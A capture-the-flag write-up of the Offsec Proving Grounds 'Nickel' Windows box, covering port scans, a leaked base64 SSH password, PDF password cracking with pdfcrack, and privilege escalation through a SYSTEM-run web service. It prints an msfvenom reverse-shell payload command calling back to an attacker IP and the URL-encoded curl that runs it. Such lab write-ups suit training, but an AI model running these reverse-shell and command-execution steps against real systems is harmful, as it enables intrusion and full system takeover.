---
title: CTF Writeup - Offsec PG Nickel
date: 2023-10-07  
author: kei5uke
description: Writeup for PG Hutch 
tags:
  - windows
  - writeup
---

# Nickel

# Enumerating with Threader3000 and Nmap

```bash
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 192.168.249.99               
------------------------------------------------------------
Scanning target 192.168.249.99
Time started: 2023-10-07 23:41:01.488351
------------------------------------------------------------
Port 22 is open
Port 21 is open
Port 139 is open
Port 135 is open
Port 445 is open
Port 3389 is open
Port 5040 is open
Port 8089 is open
Port 33333 is open
Port 49668 is open
Port 49669 is open
Port 49666 is open
Port 49665 is open
Port 49667 is open
Port 49664 is open
Port scan completed in 0:00:34.808592
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,21,139,135,445,3389,5040,8089,33333,49668,49669,49666,49665,49667,49664 -sV -sC -T4 -Pn -oA 192.168.249.99 192.168.249.99
```

```bash
nmap -p22,21,139,135,445,3389,5040,8089,33333,49668,49669,49666,49665,49667,49664 -sV -sC -T4 -Pn -oA 192.168.249.99 192.168.249.99
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 23:41 EEST
Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 93.33% done; ETC: 23:42 (0:00:05 remaining)
Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.64% done; ETC: 23:44 (0:00:00 remaining)
Stats: 0:02:48 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.18% done; ETC: 23:44 (0:00:00 remaining)
Nmap scan report for 192.168.249.99
Host is up (0.048s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2023-10-06T20:00:45
|_Not valid after:  2024-04-06T20:00:45
|_ssl-date: 2023-10-07T20:45:26+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2023-10-07T20:44:21+00:00
5040/tcp  open  unknown
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-07T20:44:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 225.99 seconds
------------------------------------------------------------
Combined scan completed in 0:04:25.777045
```

```bash
──(root💀kali)-[~/nick]
└─# nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 192.168.249.99                 1 ⨯
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 23:56 EEST
Nmap scan report for 192.168.249.99
Host is up (0.056s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2023-10-07T20:56:07+00:00

Nmap done: 1 IP address (1 host up) scanned in 3.70 seconds
```

MS-WBT-SERVER Enumeration

# HTTP Enumeration

![http.png](Nickel%20cff91a47fb794eae8107f3436b0f1748/http.png)

```bash
<h1>DevOps Dashboard</h1>
<hr>
<form action='http://169.254.3.88:33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>
<br>
<form action='http://169.254.3.88:33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>
<br>
<form action='http://169.254.3.88:33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
<hr>
```

The links in the page are not accessible. Let’s enumerate the links with curl.  

```bash
┌──(root💀kali)-[/opt/generic]
└─# curl -X GET http://192.168.249.99:33333/                         
Invalid Token
```

```bash
┌──(root💀kali)-[/opt/generic]
└─# curl -X POST http://192.168.249.99:33333/list-running-procs -d ""
name        : System Idle Process
commandline : 

name        : System
commandline : 

...

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

...

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : SgrmBroker.exe
commandline : 

name        : SearchIndexer.exe
commandline : C:\Windows\system32\SearchIndexer.exe /Embedding

name        : WmiApSrv.exe
commandline : C:\Windows\system32\wbem\WmiApSrv.exe
```

```bash
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```

This credential could be something useful.

I tried to access ssh as the user and with the password however, it does not work.

![decode.png](Nickel%20cff91a47fb794eae8107f3436b0f1748/decode.png)

It turns out that this is base64 encoded text.

```bash
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.

ariah@NICKEL C:\Users\ariah>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

I successfully obtained the shell.

![local.png](Nickel%20cff91a47fb794eae8107f3436b0f1748/local.png)

# Privilege Escalation

```bash
ariah@NICKEL C:\ftp>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\ftp

09/01/2020  12:38 PM    <DIR>          .
09/01/2020  12:38 PM    <DIR>          ..
09/01/2020  11:02 AM            46,235 Infrastructure.pdf
               1 File(s)         46,235 bytes
               2 Dir(s)   7,701,471,232 bytes free
```

Found interesting directory.

```bash
┌──(root💀kali)-[/opt/generic]
└─# scp ariah@192.168.249.99:C:/ftp/Infrastructure.pdf .
```

![pdf.png](Nickel%20cff91a47fb794eae8107f3436b0f1748/pdf.png)

Downloaded the file and tried to open it, however it’s locked with password.

```bash
┌──(root💀kali)-[/opt/generic]
└─# pdfcrack ~/nick/Infrastructure.pdf -w /usr/share/wordlists/rockyou.txt                                               6 ⨯
PDF version 1.7
Security Handler: Standard
V: 2
R: 3
P: -1060
Length: 128
Encrypted Metadata: True
FileID: 14350d814f7c974db9234e3e719e360b
U: 6aa1a24681b93038947f76796470dbb100000000000000000000000000000000
O: d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0
Average Speed: 98215.8 w/s. Current Word: 'breaxx'
Average Speed: 96516.4 w/s. Current Word: 'seshy16'
Average Speed: 96277.8 w/s. Current Word: 'mantisoy'
Average Speed: 98903.3 w/s. Current Word: 'graciel098'
Average Speed: 97724.6 w/s. Current Word: 'bbone'
found user-password: 'ariah4168'
```

I cracked the password with pdfcrack.

![info.png](Nickel%20cff91a47fb794eae8107f3436b0f1748/info.png)

The pdf contains some internal service information.

```bash
ariah@NICKEL C:\Users\ariah>curl http://localhost/?whoami
<!doctype html><html><body>dev-api started at 2023-02-17T09:16:22

        <pre>nt authority\system
</pre>
</body></html>
```

This service is run by the administrator and execute any command.

```bash
┌──(root💀kali)-[/opt/generic]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=443 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
                                                                                                                             
┌──(root💀kali)-[/opt/generic]
└─# python3 -m http.server 80                                                              
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.249.99 - - [08/Oct/2023 02:12:54] "GET /shell.exe HTTP/1.1" 200 -
```

I created shell.exe using Msfvenom  and uploaded to the server.

![urlencoder.png](Nickel%20cff91a47fb794eae8107f3436b0f1748/urlencoder.png)

I encoded the command: `cmd /c C:\Users\ariah\Music\shell.exe` using url encoder.

```bash
ariah@NICKEL C:\Users\ariah\Music>curl http://localhost/?cmd%20%2Fc%20C%3A%5CUsers%5Cariah%5CMusic%5Cshell.exe
```

I executed the curl command and got the shell.

![root.png](Nickel%20cff91a47fb794eae8107f3436b0f1748/root.png)

# Note

Relying solely on browser output can be unreliable. Using tools like curl or wget in the terminal with options (GET, POST, PUT) provides detailed information.  
Unexpected inclusion of steganography highlights the importance of keeping it in mind during assessments.